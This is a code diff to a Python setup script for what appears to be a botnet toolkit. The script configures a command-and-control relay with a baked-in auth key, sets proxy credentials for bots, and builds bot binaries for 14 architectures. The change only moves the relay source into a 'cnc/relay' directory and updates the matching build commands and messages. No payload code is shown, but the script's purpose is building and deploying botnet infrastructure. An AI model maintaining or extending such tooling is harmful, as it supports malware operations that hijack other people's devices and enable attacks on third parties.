@@ -577,7 +577,7 @@ def update_proxy_credentials(bot_path: str, username: str, password: str):
 
 def update_relay_config(base_path: str, magic_code: str):
     """Update the relay server's baked-in auth key"""
-    relay_main = os.path.join(base_path, "relay", "main.go")
+    relay_main = os.path.join(base_path, "cnc", "relay", "main.go")
     if not os.path.exists(relay_main):
         return
 
@@ -755,7 +755,7 @@ def build_relay(base_path: str) -> bool:
     try:
         go = find_go()
         info(f"Building relay server... ({go})")
-        relay_path = os.path.join(base_path, "relay")
+        relay_path = os.path.join(base_path, "cnc", "relay")
         result = subprocess.run(
             [
                 go,
@@ -904,7 +904,7 @@ def print_summary(config: dict):
     print(f"    Bot bins:     {Colors.GREEN}bins/{Colors.RESET}")
     magic = config.get("magic_code", "<magic_code>")
     print(
-        f"    Relay:        {Colors.GREEN}go build -o relay ./relay && ./relay -key {magic}{Colors.RESET}"
+        f"    Relay:        {Colors.GREEN}go build -o relay ./cnc/relay && ./relay -key {magic}{Colors.RESET}"
     )
     print()
 
@@ -1217,7 +1217,7 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         if build_relay(base_path):
             success("Relay server built")
         else:
-            warning("Relay build failed - build manually with: go build -o relay ./relay")
+            warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
 
     if confirm(
         "Would you like to build bot binaries? (14 architectures, takes a few mins)"
@@ -1352,7 +1352,7 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         if build_relay(base_path):
             success("Relay server built")
         else:
-            warning("Relay build failed - build manually with: go build -o relay ./relay")
+            warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
 
     if confirm("Would you like to build bot binaries? (takes a few mins)"):
         if build_bots(base_path):
@@ -1451,7 +1451,7 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
         if build_relay(base_path):
             success("Relay server built")
         else:
-            warning("Relay build failed - build manually with: go build -o relay ./relay")
+            warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
 
     if confirm("Would you like to build bot binaries? (takes a few mins)"):
         if build_bots(base_path):
